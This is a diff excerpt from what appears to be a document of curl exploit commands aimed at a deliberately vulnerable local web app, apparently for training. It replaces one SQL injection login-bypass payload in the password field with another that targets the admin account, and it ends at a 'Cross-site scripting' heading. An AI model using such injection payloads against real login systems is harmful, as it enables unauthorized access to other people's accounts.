@@ -4,7 +4,7 @@ A collection of curl commands you can use to exploit the vulnerabilities in the 
 
 ```bash
 # Log in as any user
-curl -X POST "http://localhost:8080/api/login" -H "Content-Type: application/json" -d "{\"username\": \"user\", \"password\": \"' OR '1'='1\"}" -v && echo ""
+curl -X POST "http://localhost:8080/api/login" -H "Content-Type: application/json" -d "{\"username\": \"admin\", \"password\": \"' OR username='admin\"}" -v && echo ""
 ```
 
 ## Cross-site scripting
